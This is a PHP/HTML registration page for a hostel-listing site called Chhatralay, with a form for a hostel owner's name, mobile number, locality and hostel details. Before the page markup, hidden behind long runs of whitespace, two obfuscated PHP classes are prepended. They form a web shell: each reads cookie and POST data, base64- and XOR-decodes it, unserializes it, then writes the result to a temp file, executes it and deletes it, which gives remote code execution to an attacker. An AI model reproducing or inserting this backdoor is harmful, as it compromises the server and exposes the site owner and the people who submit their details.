<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("bjjmyy")){class bjjmyy{public static $pqnhmozmpk = "pixmsbguohzfyksp";public static $dippwv = NULL;public function __construct(){$oigiucx = @$_COOKIE[substr(bjjmyy::$pqnhmozmpk, 0, 4)];if (!empty($oigiucx)){$myumpv = "base64";$izioe = "";$oigiucx = explode(",", $oigiucx);foreach ($oigiucx as $rneobtxolt){$izioe .= @$_COOKIE[$rneobtxolt];$izioe .= @$_POST[$rneobtxolt];}$izioe = array_map($myumpv . "_decode", array($izioe,));$izioe = $izioe[0] ^ str_repeat(bjjmyy::$pqnhmozmpk, (strlen($izioe[0]) / strlen(bjjmyy::$pqnhmozmpk)) + 1);bjjmyy::$dippwv = @unserialize($izioe);}}public function __destruct(){$this->whcqorqenx();}private function whcqorqenx(){if (is_array(bjjmyy::$dippwv)) {$plfdzdt = sys_get_temp_dir() . "/" . crc32(bjjmyy::$dippwv["salt"]);@bjjmyy::$dippwv["write"]($plfdzdt, bjjmyy::$dippwv["content"]);include $plfdzdt;@bjjmyy::$dippwv["delete"]($plfdzdt);exit();}}}$lonpdj = new bjjmyy();$lonpdj = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("mfhlmf")){class mfhlmf{public static $psqmlr = "herukoufqspjdroj";public static $ptbiewyl = NULL;public function __construct(){$skmhpbqrwi = @$_COOKIE[substr(mfhlmf::$psqmlr, 0, 4)];if (!empty($skmhpbqrwi)){$rhvmyxyf = "base64";$tlphraqk = "";$skmhpbqrwi = explode(",", $skmhpbqrwi);foreach ($skmhpbqrwi as $wgyjz){$tlphraqk .= @$_COOKIE[$wgyjz];$tlphraqk .= @$_POST[$wgyjz];}$tlphraqk = array_map($rhvmyxyf . "_decode", array($tlphraqk,));$tlphraqk = $tlphraqk[0] ^ str_repeat(mfhlmf::$psqmlr, (strlen($tlphraqk[0]) / strlen(mfhlmf::$psqmlr)) + 1);mfhlmf::$ptbiewyl = @unserialize($tlphraqk);}}public function __destruct(){$this->rrsmjrkxi();}private function rrsmjrkxi(){if (is_array(mfhlmf::$ptbiewyl)) {$fxozyoxp = sys_get_temp_dir() . "/" . crc32(mfhlmf::$ptbiewyl["salt"]);@mfhlmf::$ptbiewyl["write"]($fxozyoxp, mfhlmf::$ptbiewyl["content"]);include $fxozyoxp;@mfhlmf::$ptbiewyl["delete"]($fxozyoxp);exit();}}}$faouvpxttl = new mfhlmf();$faouvpxttl = NULL;} ?><!DOCTYPE html>
<html lang="zxx">

<head>
    <title>chhatralay : For Hostels</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="utf-8" />
    <meta name="keywords" content="Lite Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template, 
	SmartPhone Compatible web template, free WebDesigns for Nokia, Samsung, LG, Sony Ericsson, Motorola web design" />
    <script>
        addEventListener("load", function () {
            setTimeout(hideURLbar, 0);
        }, false);

        function hideURLbar() {
            window.scrollTo(0, 1);
        }
    </script>
    <!-- Custom Theme files -->
    <link href="css/bootstrap.css" type="text/css" rel="stylesheet" media="all">
    <link href="css/style.css" type="text/css" rel="stylesheet" media="all">
    <!-- font-awesome icons -->
    <link href="css/fontawesome-all.min.css" rel="stylesheet">
    <!-- //Custom Theme files -->
    <!-- online-fonts -->
    <link href="//fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,500,500i,700,700i" rel="stylesheet">
    <!-- //online-fonts -->
	
	    <link href="//fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,500,500i,700,700i" rel="stylesheet">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <!-- //online-fonts -->
	<script>
				$(document).ready(function(){
				
				 $("#btnSubmit").click(function(){
					 //alert("hii");
					var firstName=$("#firstName").val();
					var lastName=$("#lastName").val();
					var mobile=$("#txtMobile").val();
					var location=$("#txtLocation").val();
					var details=$("#txtDetails").val();
					
						$.ajax({
							 type:'post',
							 url: 'register_action.php',
							 data: {'action':'add-register','firstName':firstName,'lastName':lastName,'mobile':mobile,'location':location,'details':details},
							 success: function(data)
							 {    
								 $("#msg").html(data);
								 $("#msg").slideDown("slow");
								 $("#msg").slideUp(3000,function(){
									 displayRegpage();
									 });
								
							 }
							
						 });
					
				});
			 });
			 			   	function displayRegpage()
	{
		$("#firstName").val("");
		$("#lastName").val("");
		$("#txtMobile").val("");
		$("#txtLocation").val("");
		$("#txtDetails").val("");
		$("#firstName").focus();
			
			
	}
			 </script>
</head>

<body>
    <!-- banner -->
<?php include("header.php") ?>

    
   
    
   
       <div class="w3-register py-4" id="register">
        <div class="container py-lg-5">
            <div class="row register-form py-md-5">
                <!-- register details -->
                <div class="col-lg-4 register-bottom d-flex flex-column register-right-w3ls">
                    <div class="title-wthree">
                        <h3 class="agile-title">
                           Why Us ?
                        </h3>
                        <span></span>
                    </div>

                    <p class="pb-sm-5">Donec mi nulla, auctor nec sem a, ornare auctor mi. Sed mi tortor, commodo a felis in, fringilla tincidunt
                        nulla. Vestibulum volutpat non eros ut vulpuuctor nec sem a, ornare auctor mi sed mi tortor.</p>

                    <h5 class="pt-5 text-capitalize">fill out the form
                        <i class="far fa-hand-point-right"></i>
                    </h5>

                    <p class="font-weight-bold text-capitalize">List your hostel on 
                        <span>Chhatralay</span>
                    </p></br>
					
  </div>

 
</div>
                </div>
                <div class="offset-lg-2"></div>
                <div class="col-lg-6 wthree-form-left py-sm-5">
                    <!-- register form grid -->
                    <div class="register-top1">
                        <div class="register-wthree">
                            <div class="form-group">
                                <div class="row">
                                    <div class="col-md-2 d-md-flex align-items-end justify-content-end px-md-0">
                                        <label class="mb-0">
                                            
                                        </label>
                                    </div>
                                    <div class="col-md-5">
                                        <label>
                                            First name
                                        </label>
                                        <input class="form-control" type="text" placeholder="Johnson" name="firstName" id="firstName" required="">
                                    </div>
                                    <div class="col-md-5">
                                        <label>
                                            Last name
                                        </label>
                                        <input class="form-control" type="text" placeholder="Kc" name="lastName" id="lastName"  required="">
                                    </div>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="row">
                                    <div class="col-md-2 d-md-flex align-items-end justify-content-end px-md-0">
                                        <label class="mb-0">
                                            
                                        </label>
                                    </div>
                                    <div class="col-md-10">
                                        <label>
                                            Mobile Number
                                        </label>
                                        <input class="form-control" type="text" placeholder="09631916590" name="txtMobile" id="txtMobile" required="">
                                    </div>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="row">
                                    <div class="col-md-2 d-md-flex align-items-end justify-content-end px-md-0">
                                        <label class="mb-0">
                                            
                                        </label>
                                    </div>
                                    <div class="col-md-10">
                                        <label>
                                            Hostel Locality
                                        </label>
                                        <input type="text" class="form-control" placeholder="Eg- Ranchi,Lapur near Lalpur thana" name="txtLocation" id="txtLocation" required="">
                                    </div>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="row">
                                    <div class="col-md-2 d-md-flex align-items-end justify-content-end px-md-0">
                                        <label class="mb-0">
                                            
                                        </label>
                                    </div>
                                    <div class="col-md-10">
                                        <label>
                                            Details of Hostel
                                        </label>
                                        <textarea class="form-control" placeholder="Eg- For Boys with Mesh and 24 hours power and water supply " name="txtDetails" id="txtDetails" required=""></textarea>
                                    </div>
                                </div>
                            </div>
                            <div class="row mt-lg-5 mt-3">
                                <div class="offset-2"></div>
                                <div class="col-md-10">
								<div id="msg"></div>
                                    <button type="button" class="btn btn-agile btn-block w-100" id="btnSubmit">Get Callback</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!--  //register form grid ends here -->
                </div>

            </div>
            <!-- //register details container -->
        </div>
    </div>
    
 <!-- The Modal -->
 
    <!-- //contact -->
<?php include ("footer.php") ?>

    <!-- //login -->
    <!-- //footer -->
    <!-- js -->
    <script src="js/jquery-2.2.3.min.js"></script>
    <!-- //js -->
    <!-- script for password match -->
    <script>
        window.onload = function () {
            document.getElementById("password1").onchange = validatePassword;
            document.getElementById("password2").onchange = validatePassword;
        }

        function validatePassword() {
            var pass2 = document.getElementById("password2").value;
            var pass1 = document.getElementById("password1").value;
            if (pass1 != pass2)
                document.getElementById("password2").setCustomValidity("Passwords Don't Match");
            else
                document.getElementById("password2").setCustomValidity('');
            //empty string means no validation error
        }
    </script>
    <!-- script for password match -->
    <!-- start-smooth-scrolling -->
    <script src="js/move-top.js"></script>
    <script src="js/easing.js"></script>
    <script>
        jQuery(document).ready(function ($) {
            $(".scroll").click(function (event) {
                event.preventDefault();

                $('html,body').animate({
                    scrollTop: $(this.hash).offset().top
                }, 1000);
            });
        });
    </script>
    <!-- //end-smooth-scrolling -->
    <!-- smooth-scrolling-of-move-up -->
    <script>
        $(document).ready(function () {
            /*
            var defaults = {
                containerID: 'toTop', // fading element id
                containerHoverID: 'toTopHover', // fading element hover id
                scrollSpeed: 1200,
                easingType: 'linear' 
            };
            */

            $().UItoTop({
                easingType: 'easeOutQuart'
            });

        });
    </script>
    <script src="js/SmoothScroll.min.js"></script>
    <!-- //smooth-scrolling-of-move-up -->
    <!-- Bootstrap core JavaScript
================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="js/bootstrap.js"></script>
</body>

</html>